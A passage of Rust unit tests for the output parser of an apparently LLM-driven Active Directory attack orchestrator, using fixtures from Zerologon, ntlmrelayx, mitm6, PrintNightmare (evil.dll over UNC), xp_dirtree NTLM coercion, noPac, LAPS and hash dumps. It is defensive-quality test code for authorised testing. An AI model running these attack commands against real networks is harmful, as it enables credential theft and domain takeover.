        // No vulns array means the orchestrator won't add a phantom
        // zerologon entry to state for a patched DC.
        assert!(discoveries.get("vulnerabilities").is_none());
    }

    #[test]
    fn parse_tool_output_zerologon_falls_back_to_target_ip_param() {
        // Older dispatchers send `target_ip` rather than `dc_ip`. The parser
        // must accept either so we don't drop the discovery on a payload
        // shape that the LLM-routed automation in zerologon.rs already uses.
        let output = "SMB  192.168.58.210  445  DC01  VULNERABLE";
        let params = json!({"target_ip": "192.168.58.210"});
        let discoveries = parse_tool_output("zerologon_check", output, &params);
        let vulns = discoveries["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns[0]["target"], "192.168.58.210");
    }

    #[test]
    fn parse_tool_output_zerologon_skipped_when_dc_ip_missing() {
        // Without an IP we'd produce a vuln_id of `zerologon_` which would
        // collide across DCs. Skip rather than emit a malformed entry.
        let output = "SMB  192.168.58.210  445  DC01  VULNERABLE";
        let params = json!({});
        let discoveries = parse_tool_output("zerologon_check", output, &params);
        assert!(discoveries.get("vulnerabilities").is_none());
    }

    #[test]
    fn parse_tool_output_zerologon_vuln_id_is_idempotent_on_same_dc() {
        // Two parser runs on the same DC must produce the same vuln_id so
        // the orchestrator's dedup machinery can recognise them as the same
        // discovery (and not double-count toward state.discovered_vulnerabilities).
        let out = "SMB  192.168.58.210  445  DC01  VULNERABLE";
        let params = json!({"dc_ip": "192.168.58.210"});
        let a = parse_tool_output("zerologon_check", out, &params);
        let b = parse_tool_output("zerologon_check", out, &params);
        assert_eq!(
            a["vulnerabilities"][0]["vuln_id"],
            b["vulnerabilities"][0]["vuln_id"]
        );
    }
    // ── password_policy ───────────────────────────────────────────────

    #[test]
    fn parse_tool_output_password_policy_extracts_fields() {
        let output = "Minimum password length: 7\n\
                      Account lockout threshold: 5\n\
                      Account lockout duration: 30\n";
        let params = json!({"domain": "contoso.local", "target": "192.168.58.10"});
        let disc = parse_tool_output("password_policy", output, &params);
        let policies = disc["password_policies"]
            .as_array()
            .expect("password_policies array");
        assert_eq!(policies.len(), 1);
        assert_eq!(policies[0]["domain"], "contoso.local");
        assert_eq!(policies[0]["target_ip"], "192.168.58.10");
        assert_eq!(policies[0]["lockout_threshold"], "5");
        assert_eq!(policies[0]["min_password_length"], "7");
    }

    #[test]
    fn parse_tool_output_password_policy_skipped_when_domain_empty() {
        let output = "Minimum password length: 7\n";
        let params = json!({"target": "192.168.58.10"});
        let disc = parse_tool_output("password_policy", output, &params);
        assert!(disc.get("password_policies").is_none());
    }

    #[test]
    fn parse_tool_output_password_policy_skipped_when_output_empty() {
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("password_policy", "", &params);
        assert!(disc.get("password_policies").is_none());
    }

    #[test]
    fn parse_tool_output_password_policy_partial_fields() {
        // Only lockout threshold found — min_length missing is fine.
        let output = "Account Lockout Threshold: 0\n";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("password_policy", output, &params);
        let policies = disc["password_policies"]
            .as_array()
            .expect("password_policies");
        assert_eq!(policies[0]["lockout_threshold"], "0");
        assert!(policies[0].get("min_password_length").is_none());
    }

    // ── evil_winrm ────────────────────────────────────────────────────

    #[test]
    fn parse_tool_output_evil_winrm_shell_success() {
        let output = "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("evil_winrm", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns.len(), 1);
        assert_eq!(vulns[0]["vuln_type"], "winrm_access");
        assert_eq!(vulns[0]["target"], "192.168.58.20");
        assert_eq!(vulns[0]["vuln_id"], "winrm_access_192_168_58_20");
    }

    /// `DOMAIN\user` on its own is the stdout of a command the model chose to
    /// run. It is not evidence a session was established, and accepting any
    /// backslash minted `winrm_access` off a Windows path in a failure message.
    #[test]
    fn parse_tool_output_evil_winrm_bare_backslash_is_not_access() {
        let params = json!({"target": "192.168.58.20"});
        for output in [
            "CONTOSO\\alice\n",
            "[-] Cannot find path 'C:\\Users\\admin\\loot.txt'\n",
        ] {
            let disc = parse_tool_output("evil_winrm", output, &params);
            assert!(
                disc.get("vulnerabilities").is_none(),
                "minted winrm_access from {output:?}"
            );
        }
    }

    #[test]
    fn parse_tool_output_evil_winrm_ps_prompt() {
        let output = "PS C:\\Users\\Administrator> whoami\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("evil_winrm", output, &params);
        assert!(disc.get("vulnerabilities").is_some());
    }

    #[test]
    fn parse_tool_output_evil_winrm_no_success_marker() {
        let output = "[!] Connection timed out\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("evil_winrm", output, &params);
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── xfreerdp ─────────────────────────────────────────────────────

    #[test]
    fn parse_tool_output_xfreerdp3_auth_success() {
        // FreeRDP 3 logs rc directly, so a successful auth reads "status 1".
        let output = "[ERROR][com.freerdp.core] - Authentication only, exit status 1\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("xfreerdp", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns[0]["vuln_type"], "rdp_access");
        assert_eq!(vulns[0]["target"], "192.168.58.20");
    }

    #[test]
    fn parse_tool_output_xfreerdp3_bad_creds_is_not_access() {
        // Same run, wrong password: FreeRDP 3 reports "status 0" here. Reading
        // that digit as success inverted the whole check.
        let output = "\
[WARN][com.freerdp.client.common] - Connection aborted: credentials do not work [ERRCONNECT_LOGON_FAILURE]\n\
[ERROR][com.freerdp.core] - Authentication only, exit status 0\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("xfreerdp", output, &params);
        assert!(disc.get("vulnerabilities").is_none());
    }

    #[test]
    fn parse_tool_output_xfreerdp2_auth_success() {
        // FreeRDP 2 logs !status, so the same success reads "status 0".
        let output = "[ERROR][com.freerdp.core] - Authentication only, exit status 0\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("xfreerdp", output, &params);
        assert!(disc.get("vulnerabilities").is_some());
    }

    #[test]
    fn parse_tool_output_xfreerdp_failure() {
        let output = "ERRCONNECT_LOGON_FAILURE [0x00020014]\n";
        let params = json!({"target": "192.168.58.20"});
        let disc = parse_tool_output("xfreerdp", output, &params);
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── ntds_dit_extract ──────────────────────────────────────────────

    #[test]
    fn parse_tool_output_ntds_dit_extract() {
        // ntds_dit_extract output is secretsdump format
        let output = "Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("ntds_dit_extract", output, &params);
        assert!(disc.get("hashes").is_some() || disc.get("credentials").is_some());
    }

    // ── smb_login_check ───────────────────────────────────────────────

    #[test]
    fn parse_tool_output_smb_login_check() {
        let output = "[+] 192.168.58.10 contoso.local\\alice:Password1 (Pwn3d!)";
        let params = json!({"domain": "contoso.local", "target_ip": "192.168.58.10"});
        let disc = parse_tool_output("smb_login_check", output, &params);
        let creds = disc["credentials"].as_array().expect("credentials");
        assert!(!creds.is_empty());
    }

    // ── mssql_enum_impersonation ──────────────────────────────────────

    #[test]
    fn parse_tool_output_mssql_enum_impersonation() {
        let output = "class  class_desc  major_id  type  permission_name  state  state_desc\n\
                      100    SERVER      1         IM    IMPERSONATE      G      GRANT\n";
        let params = json!({"target": "192.168.58.30", "domain": "contoso.local"});
        let disc = parse_tool_output("mssql_enum_impersonation", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert!(!vulns.is_empty());
        assert_eq!(vulns[0]["vuln_type"], "mssql_impersonation");
    }

    #[test]
    fn parse_tool_output_mssql_enum_impersonation_empty() {
        let output = "No impersonation permissions found";
        let params = json!({"target": "192.168.58.30", "domain": "contoso.local"});
        let disc = parse_tool_output("mssql_enum_impersonation", output, &params);
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── mssql_enum_linked_servers ─────────────────────────────────────

    #[test]
    fn parse_tool_output_mssql_enum_linked_servers_returns_vulns() {
        // `SELECT name FROM sys.servers WHERE is_linked = 1` — single `name`
        // column; parse_mssql_linked_servers reads one linked server per row.
        let output = "SQL (CONTOSO\\alice  guest@master)> name\n\
                      -------\n\
                      sql02\n\
                      SQL (CONTOSO\\alice  guest@master)>\n";
        let params = json!({"target": "192.168.58.30", "domain": "contoso.local"});
        let disc = parse_tool_output("mssql_enum_linked_servers", output, &params);
        assert!(disc.get("vulnerabilities").is_some());
    }

    // ── enumerate_domain_trusts ───────────────────────────────────────

    #[test]
    fn parse_tool_output_enumerate_domain_trusts() {
        let output = "cn: fabrikam.local\n\
                      trustDirection: 3\n\
                      trustType: 2\n\
                      trustAttributes: 8\n\
                      flatName: FABRIKAM\n";
        let disc = parse_tool_output("enumerate_domain_trusts", output, &json!({}));
        let td = disc["trusted_domains"].as_array().expect("trusted_domains");
        assert_eq!(td.len(), 1);
        assert_eq!(td[0]["domain"], "fabrikam.local");
        assert_eq!(td[0]["trust_type"], "forest");
    }

    // ── ldap_acl_enumeration ──────────────────────────────────────────

    #[test]
    fn parse_tool_output_ldap_acl_enumeration_empty() {
        let disc = parse_tool_output(
            "ldap_acl_enumeration",
            "",
            &json!({"domain": "contoso.local"}),
        );
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── merge_discoveries: discovered_users and shares ─────────────────

    #[test]
    fn merge_discoveries_combines_discovered_users() {
        let d1 = json!({"discovered_users": [{"username": "alice", "domain": "contoso.local"}]});
        let d2 = json!({"discovered_users": [{"username": "bob", "domain": "contoso.local"}]});
        let merged = merge_discoveries(&[d1, d2]);
        let users = merged["discovered_users"]
            .as_array()
            .expect("discovered_users");
        assert_eq!(users.len(), 2);
    }

    #[test]
    fn merge_discoveries_combines_shares() {
        let d1 = json!({"shares": [{"name": "SYSVOL", "ip": "192.168.58.10"}]});
        let d2 = json!({"shares": [{"name": "NETLOGON", "ip": "192.168.58.10"}]});
        let merged = merge_discoveries(&[d1, d2]);
        let shares = merged["shares"].as_array().expect("shares");
        assert_eq!(shares.len(), 2);
    }

    #[test]
    fn merge_discoveries_combines_trusted_domains() {
        let d1 = json!({"trusted_domains": [{"domain": "fabrikam.local", "trust_type": "forest"}]});
        let d2 = json!({"trusted_domains": [{"domain": "child.contoso.local", "trust_type": "parent_child"}]});
        let merged = merge_discoveries(&[d1, d2]);
        let td = merged["trusted_domains"]
            .as_array()
            .expect("trusted_domains");
        assert_eq!(td.len(), 2);
    }

    #[test]
    fn merge_discoveries_keeps_owned_when_richer_host_replaces_it() {
        let exec = json!({"hosts": [
            {"ip": "192.168.58.20", "services": ["445/tcp"], "owned": true},
        ]});
        let recon = json!({"hosts": [
            {"ip": "192.168.58.20", "services": ["135/tcp", "445/tcp", "3389/tcp"], "owned": false},
        ]});
        let merged = merge_discoveries(&[exec, recon]);
        let hosts = merged["hosts"].as_array().expect("hosts");
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0]["services"].as_array().unwrap().len(), 3);
        assert_eq!(hosts[0]["owned"], true);
    }

    #[test]
    fn merge_discoveries_keeps_owned_when_richer_host_arrives_first() {
        let recon = json!({"hosts": [
            {"ip": "192.168.58.20", "services": ["135/tcp", "445/tcp"], "owned": false},
        ]});
        let exec = json!({"hosts": [
            {"ip": "192.168.58.20", "services": ["445/tcp"], "owned": true},
        ]});
        let merged = merge_discoveries(&[recon, exec]);
        let hosts = merged["hosts"].as_array().expect("hosts");
        assert_eq!(hosts[0]["owned"], true);
    }

    #[test]
    fn merge_discoveries_leaves_unowned_hosts_unowned() {
        let d1 = json!({"hosts": [{"ip": "192.168.58.20", "services": ["445/tcp"]}]});
        let d2 = json!({"hosts": [{"ip": "192.168.58.20", "services": ["445/tcp", "88/tcp"]}]});
        let merged = merge_discoveries(&[d1, d2]);
        let hosts = merged["hosts"].as_array().expect("hosts");
        assert_ne!(hosts[0]["owned"], true);
    }

    #[test]
    fn merge_discoveries_skips_hosts_with_empty_ip() {
        let d = json!({"hosts": [{"ip": "", "hostname": "mystery"}]});
        let merged = merge_discoveries(&[d]);
        assert!(merged.get("hosts").is_none());
    }

    // ── looks_like_ip_pub ─────────────────────────────────────────────

    #[test]
    fn looks_like_ip_pub_accepts_valid() {
        assert!(looks_like_ip_pub("192.168.58.10"));
        assert!(looks_like_ip_pub("192.168.58.240"));
    }

    #[test]
    fn looks_like_ip_pub_rejects_invalid() {
        assert!(!looks_like_ip_pub("contoso.local"));
        assert!(!looks_like_ip_pub("not-an-ip"));
        assert!(!looks_like_ip_pub("256.1.1.1"));
    }

    // ── relay_and_coerce: no relayed_user ────────────────────────────

    #[test]
    fn parse_tool_output_relay_and_coerce_no_relayed_user_still_emits() {
        // PFX_FILE present but no RELAYED_USER line — should still emit vuln.
        let output = "PFX_FILE=/tmp/ares_relay_5/DC01.pfx\n";
        let params = json!({"coerce_target": "192.168.58.10", "coerce_domain": "contoso.local"});
        let disc = parse_tool_output("relay_and_coerce", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns[0]["vuln_type"], "certificate_obtained");
        // No user in details when RELAYED_USER is absent
        assert!(vulns[0]["details"].get("target_user").is_none());
    }

    // ── certipy_esc4/esc7_full_chain reuse the ESC1/ESC13/auth arm ────

    #[test]
    fn parse_tool_output_certipy_esc4_full_chain_extracts_hash() {
        let output = "[*] Got hash for 'administrator@CONTOSO.LOCAL': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0";
        let disc = parse_tool_output(
            "certipy_esc4_full_chain",
            output,
            &json!({"domain": "contoso.local"}),
        );
        let hashes = disc["hashes"].as_array().expect("hashes");
        assert_eq!(hashes.len(), 1);
        assert_eq!(hashes[0]["username"], "administrator");
        assert_eq!(hashes[0]["domain"], "contoso.local");
    }

    #[test]
    fn parse_tool_output_certipy_esc7_full_chain_extracts_hash() {
        let output = "[*] Got hash for 'administrator@CONTOSO.LOCAL': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0";
        let disc = parse_tool_output(
            "certipy_esc7_full_chain",
            output,
            &json!({"domain": "contoso.local"}),
        );
        assert_eq!(disc["hashes"].as_array().unwrap().len(), 1);
    }

    // ── ntlmrelayx_* arms ─────────────────────────────────────────────

    #[test]
    fn parse_tool_output_ntlmrelayx_to_adcs_emits_certificate_obtained() {
        let output = "\
[*] Servers started, waiting for connections
[*] SMBD-Thread-1: Received connection from 192.168.58.20, attacking target http://ca01.contoso.local
[*] (SMB): Authenticating connection from CONTOSO/DC01$@192.168.58.20 against http://ca01.contoso.local SUCCEED [1]
[*] GOT CERTIFICATE! ID 42
[*] Writing PKCS#12 certificate to /home/kali/loot/DC01.pfx
[*] Certificate successfully written to file";
        let params = json!({
            "ca_host": "192.168.58.50",
        });
        let disc = parse_tool_output("ntlmrelayx_to_adcs", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns.len(), 1);
        assert_eq!(vulns[0]["vuln_type"], "certificate_obtained");
        assert_eq!(vulns[0]["details"]["target_user"], "DC01$");
        assert_eq!(vulns[0]["target"], "192.168.58.50");
        let vid = vulns[0]["vuln_id"].as_str().unwrap();
        assert!(!vid.contains('$'), "vuln_id must sanitise $: {vid}");
    }

    #[test]
    fn parse_tool_output_ntlmrelayx_distinct_accounts_get_distinct_vuln_ids() {
        let relay = |account: &str, pfx: &str| {
            format!(
                "[*] (SMB): Authenticating connection from CONTOSO/{account}@192.168.58.20 against http://ca01.contoso.local SUCCEED [1]\n\
[*] GOT CERTIFICATE! ID 42\n\
[*] Writing PKCS#12 certificate to /home/kali/loot/{pfx}.pfx"
            )
        };
        let params = json!({"ca_host": "192.168.58.50"});
        let id_for = |out: &str| {
            parse_tool_output("ntlmrelayx_to_adcs", out, &params)["vulnerabilities"][0]["vuln_id"]
                .as_str()
                .unwrap()
                .to_string()
        };

        let dc = id_for(&relay("DC01$", "DC01"));
        let web = id_for(&relay("WEB01$", "WEB01"));
        assert_ne!(dc, web, "each relayed account needs its own vuln_id");
    }

    #[test]
    fn parse_tool_output_ntlmrelayx_falls_back_to_pfx_path_without_relay_line() {
        let output = "\
[*] GOT CERTIFICATE! ID 7
[*] Writing PKCS#12 certificate to /home/kali/loot/alice.pfx";
        let params = json!({"ca_host": "192.168.58.50"});
        let disc = parse_tool_output("ntlmrelayx_to_adcs", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns[0]["details"]["target_user"], "alice");
    }

    #[test]
    fn parse_tool_output_ntlmrelayx_multirelay_parses_dumped_sam_hashes() {
        let output = "\
[*] Servers started, waiting for connections
[*] Authenticating against smb://192.168.58.30 as CONTOSO/WEB01$ SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
localadmin:1001:aad3b435b51404eeaad3b435b51404ee:abcdef1234567890abcdef1234567890:::
[*] Cleaning up...";
        let params = json!({"target_domain": "contoso.local"});
        let disc = parse_tool_output("ntlmrelayx_multirelay", output, &params);
        let hashes = disc["hashes"].as_array().expect("hashes");
        assert!(
            hashes.len() >= 2,
            "expected dumped SAM hashes to land, got {hashes:?}"
        );
        assert!(hashes.iter().any(|h| h["username"] == "Administrator"));
    }

    #[test]
    fn parse_tool_output_ntlmrelayx_to_ldaps_captures_netntlmv2() {
        let output = "\
[*] Servers started, waiting for connections
[SMB] NTLMv2-SSP Hash     : svc_test::CONTOSO:1122334455667788:aabbccddeeff00112233445566778899:0101000000000000000102030405060708090a";
        let params = json!({"dc_ip": "192.168.58.10", "domain": "contoso.local"});
        let disc = parse_tool_output("ntlmrelayx_to_ldaps", output, &params);
        assert!(
            disc.get("hashes")
                .and_then(|v| v.as_array())
                .is_some_and(|a| !a.is_empty()),
            "should extract folded NetNTLMv2 hash from ntlmrelayx stdout"
        );
    }

    #[test]
    fn parse_tool_output_ntlmrelayx_to_smb_no_capture_stays_silent() {
        let output = "[*] Servers started, waiting for connections\n[*] Setting up SMB Server\n";
        let params = json!({"target_ip": "192.168.58.30"});
        let disc = parse_tool_output("ntlmrelayx_to_smb", output, &params);
        assert!(disc.get("hashes").is_none());
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── start_mitm6 ───────────────────────────────────────────────────

    #[test]
    fn parse_tool_output_start_mitm6_extracts_netntlmv2() {
        let output = "\
Starting mitm6 using the domain: contoso.local
[SMB] NTLMv2-SSP Hash     : alice::CONTOSO:1122334455667788:aabbccddeeff00112233445566778899:0101000000000000000102030405060708090a";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("start_mitm6", output, &params);
        assert!(disc.get("hashes").is_some());
    }

    #[test]
    fn parse_tool_output_start_mitm6_silent_without_hash() {
        let output = "Starting mitm6 using the domain: contoso.local\n";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("start_mitm6", output, &params);
        assert!(disc.get("hashes").is_none());
    }

    // ── mssql_ntlm_coerce ─────────────────────────────────────────────

    #[test]
    fn parse_tool_output_mssql_ntlm_coerce_emits_coercion_marker() {
        let output = "SQL (CONTOSO\\alice  guest@master)> EXEC master..xp_dirtree '\\\\192.168.58.5\\share'\nsubdirectory       depth";
        let params = json!({
            "target": "192.168.58.30",
            "listener_ip": "192.168.58.5",
        });
        let disc = parse_tool_output("mssql_ntlm_coerce", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns.len(), 1);
        assert_eq!(vulns[0]["vuln_type"], "coercion_attempted");
        assert_eq!(vulns[0]["target"], "192.168.58.30");
        assert_eq!(vulns[0]["details"]["unc_path"], "\\\\192.168.58.5\\share");
    }

    #[test]
    fn parse_tool_output_mssql_ntlm_coerce_survives_empty_output() {
        let params = json!({"target": "192.168.58.30", "listener_ip": "192.168.58.5"});
        let disc = parse_tool_output("mssql_ntlm_coerce", "", &params);
        assert_eq!(
            disc["vulnerabilities"].as_array().unwrap()[0]["vuln_type"],
            "coercion_attempted"
        );
    }

    #[test]
    fn parse_tool_output_mssql_ntlm_coerce_skipped_when_params_missing() {
        let disc = parse_tool_output("mssql_ntlm_coerce", "", &json!({}));
        assert!(disc.get("vulnerabilities").is_none());
    }

    /// The wiring that keeps a successful forge from being scored as a failure:
    /// without this arm `discoveries` comes back empty and the orchestrator's
    /// exploit evidence gate sees nothing a parser produced.
    #[test]
    fn parse_tool_output_silver_ticket_records_the_forged_spn() {
        let output = format!(
            "[*] Signing/Encrypting final ticket\n\
             [*] Saving ticket in Administrator.ccache\n\
             {SILVER_TICKET_SPN_MARKER}cifs/sql01.contoso.local\n"
        );
        let params = json!({
            "username": "SQL01$",
            "domain": "contoso.local",
            "spn": "cifs/sql01.contoso.local",
        });
        let disc = parse_tool_output("generate_silver_ticket", &output, &params);
        let spns = disc["spns"].as_array().expect("spns");
        assert_eq!(spns.len(), 1);
        assert_eq!(spns[0]["spn"], "cifs/sql01.contoso.local");
        assert_eq!(spns[0]["service_account"], "SQL01$");
        assert_eq!(spns[0]["ticket_path"], "Administrator.ccache");
    }

    #[test]
    fn parse_tool_output_silver_ticket_silent_on_failure() {
        let output = "[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP";
        let disc = parse_tool_output("generate_silver_ticket", output, &json!({}));
        assert!(disc.get("spns").is_none());
    }

    // ── nopac ─────────────────────────────────────────────────────────

    #[test]
    fn parse_tool_output_nopac_extracts_dcsync_hashes() {
        let output = "\
[*] Getting TGT for CONTOSO\\bob
[*] will try to impersonate administrator
[*] Rename ccache to administrator_dc01.contoso.local.ccache
[*] Dumping Domain Credentials\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9163a4143c00569b53db0feef6bdf2ad:::";
        let params = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
        });
        let disc = parse_tool_output("nopac", output, &params);
        let hashes = disc["hashes"].as_array().expect("hashes");
        assert_eq!(hashes.len(), 1);
        assert_eq!(hashes[0]["username"], "krbtgt");
        assert_eq!(hashes[0]["domain"], "contoso.local");
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns[0]["vuln_type"], "nopac");
        assert_eq!(vulns[0]["target"], "192.168.58.10");
    }

    #[test]
    fn parse_tool_output_nopac_silent_on_failure() {
        let output = "[-] noPac exploitation failed: target patched (KB5008380)";
        let disc = parse_tool_output(
            "nopac",
            output,
            &json!({"domain": "contoso.local", "dc_ip": "192.168.58.10"}),
        );
        assert!(disc.get("hashes").is_none());
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── printnightmare ────────────────────────────────────────────────

    #[test]
    fn parse_tool_output_printnightmare_emits_vuln_on_success_marker() {
        let output = "\
[*] Connecting to ncacn_np:192.168.58.22[\\PIPE\\spoolss]\n[+] Bind OK\n[+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\n[*] Executing \\??\\UNC\\192.168.58.10\\share\\evil.dll\n[*] Try 1...\n[*] Stage0: 0\n[+] Exploit Completed";
        let params = json!({"target": "192.168.58.22"});
        let disc = parse_tool_output("printnightmare", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
        assert_eq!(vulns[0]["vuln_type"], "printnightmare");
        assert_eq!(vulns[0]["target"], "192.168.58.22");
    }

    #[test]
    fn parse_tool_output_printnightmare_silent_on_trigger_without_outcome() {
        let output = "\
[*] Connecting to ncacn_np:192.168.58.22[\\PIPE\\spoolss]\n[+] Bind OK\n[*] Executing \\??\\UNC\\192.168.58.10\\share\\evil.dll\n[*] Try 1...\n[*] Try 2...\n[*] Try 3...";
        let disc = parse_tool_output(
            "printnightmare",
            output,
            &json!({"target": "192.168.58.22"}),
        );
        assert!(disc.get("vulnerabilities").is_none());
    }

    #[test]
    fn parse_tool_output_printnightmare_silent_on_failure() {
        let output = "[*] Connecting to ncacn_np:192.168.58.22[\\PIPE\\spoolss]\n[-] Failed to find driver\n";
        let disc = parse_tool_output(
            "printnightmare",
            output,
            &json!({"target": "192.168.58.22"}),
        );
        assert!(disc.get("vulnerabilities").is_none());
    }

    // ── laps_dump ─────────────────────────────────────────────────────

    #[test]
    fn parse_tool_output_laps_dump_extracts_admin_creds() {
        let output = "\
LDAP  192.168.58.10  389  DC01  [*] Getting LAPS Passwords
LDAP  192.168.58.10  389  DC01  Computer:SRV01                    Password:LapsPass!Local";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("laps_dump", output, &params);
        let creds = disc["credentials"].as_array().expect("credentials");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0]["username"], "Administrator");
        assert_eq!(creds[0]["password"], "LapsPass!Local");
        assert_eq!(creds[0]["source_host"], "SRV01");
        assert_eq!(creds[0]["is_admin"], true);
    }

    #[test]
    fn parse_tool_output_laps_dump_empty_output() {
        let disc = parse_tool_output("laps_dump", "", &json!({"domain": "contoso.local"}));
        assert!(disc.get("credentials").is_none());
    }

    #[test]
    fn parse_tool_output_psexec_emits_owned_host() {
        let output =
            "[*] Creating service qWxZ on 192.168.58.20.....\n[*] Starting service qWxZ.....\n";
        let params = json!({"target": "192.168.58.20", "username": "admin"});
        let disc = parse_tool_output("psexec", output, &params);
        let hosts = disc["hosts"].as_array().expect("hosts");
        assert_eq!(hosts[0]["ip"], "192.168.58.20");
        assert_eq!(hosts[0]["owned"], true);
    }

    #[test]
    fn parse_tool_output_kerberos_renamed_variants_are_all_wired() {
        let output = "[*] Starting service qWxZ.....\n";
        let params = json!({"target": "dc01.contoso.local", "target_ip": "192.168.58.10"});
        for tool in [
            "psexec_kerberos",
            "wmiexec_kerberos",
            "smbexec_kerberos",
            "psexec",
            "wmiexec",
            "smbexec",
        ] {
            let disc = parse_tool_output(tool, output, &params);
            let hosts = disc["hosts"]
                .as_array()
                .unwrap_or_else(|| panic!("{tool} produced no hosts"));
            assert_eq!(hosts[0]["owned"], true, "{tool} must credit ownership");
        }
    }

    #[test]
    fn parse_tool_output_smbexec_logon_failure_is_silent() {
        let output = "[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid.)";
        let params = json!({"target": "192.168.58.20", "username": "admin"});
        let disc = parse_tool_output("smbexec", output, &params);
        assert!(disc.get("hosts").is_none());
    }

    #[test]
    fn parse_tool_output_pth_rpcclient_emits_unowned_host() {
        let output = "Account Name: admin, Authority Name: CONTOSO\n";
        let params = json!({"target": "192.168.58.20", "username": "admin"});
        let disc = parse_tool_output("pth_rpcclient", output, &params);
        let hosts = disc["hosts"].as_array().expect("hosts");
        assert_eq!(hosts[0]["owned"], false);
    }

    #[test]
    fn parse_tool_output_pth_smbclient_emits_share() {
        let output = "\t\t9756244 blocks of size 4096. 5364823 blocks available";
        let params = json!({"target": "192.168.58.20", "share": "C$"});
        let disc = parse_tool_output("pth_smbclient", output, &params);
        let shares = disc["shares"].as_array().expect("shares");
        assert_eq!(shares[0]["host"], "192.168.58.20");
        assert_eq!(shares[0]["name"], "C$");
    }

    #[test]
    fn parse_tool_output_pth_smbclient_access_denied_is_silent() {
        let output = "tree connect failed: NT_STATUS_ACCESS_DENIED\n";
        let params = json!({"target": "192.168.58.20", "share": "C$"});
        let disc = parse_tool_output("pth_smbclient", output, &params);
        assert!(disc.get("shares").is_none());
    }

    #[test]
    fn parse_tool_output_get_tgt_emits_kdc_host() {
        let output = "[*] Saving ticket in admin.ccache\n";
        let params =
            json!({"domain": "contoso.local", "username": "admin", "dc_ip": "192.168.58.10"});
        let disc = parse_tool_output("get_tgt", output, &params);
        let hosts = disc["hosts"].as_array().expect("hosts");
        assert_eq!(hosts[0]["ip"], "192.168.58.10");
        assert_eq!(hosts[0]["services"][0], "88/tcp");
    }

    #[test]
    fn parse_tool_output_get_tgt_preauth_failure_is_silent() {
        let output = "[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED";
        let params = json!({"domain": "contoso.local", "dc_ip": "192.168.58.10"});
        let disc = parse_tool_output("get_tgt", output, &params);
        assert!(disc.get("hosts").is_none());
    }

    #[test]
    fn parse_tool_output_mssql_command_emits_sql_host() {
        let output = "[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\nname\nsql02\n";
        let params = json!({"target": "192.168.58.30", "username": "admin"});
        let disc = parse_tool_output("mssql_command", output, &params);
        let hosts = disc["hosts"].as_array().expect("hosts");
        assert_eq!(hosts[0]["services"][0], "1433/tcp (ms-sql-s)");
        assert_eq!(hosts[0]["roles"][0], "mssql");
    }

    #[test]
    fn parse_tool_output_mssql_command_login_failure_is_silent() {
        let output = "[-] ERROR(SQL01): Line 1: Login failed for user 'CONTOSO\\admin'.";
        let params = json!({"target": "192.168.58.30", "username": "admin"});
        let disc = parse_tool_output("mssql_command", output, &params);
        assert!(disc.get("hosts").is_none());
    }

    #[test]
    fn parse_tool_output_netexec_auth_check_credits_successful_bind() {
        let output = "\
SMB  192.168.58.40  445  DC02  [*] Windows Server 2022 (name:DC02) (domain:fabrikam.local)
SMB  192.168.58.40  445  DC02  [+] fabrikam.local\\svc_sql:aad3b435b51404eeaad3b435b51404ee";
        let params = json!({
            "username": "svc_sql",
            "domain": "fabrikam.local",
            "hash": "aad3b435b51404eeaad3b435b51404ee",
        });
        let disc = parse_tool_output("netexec_auth_check", output, &params);
        let hashes = disc["hashes"].as_array().expect("hashes");
        assert_eq!(hashes.len(), 1);
        assert_eq!(hashes[0]["username"], "svc_sql");
        assert_eq!(hashes[0]["domain"], "fabrikam.local");
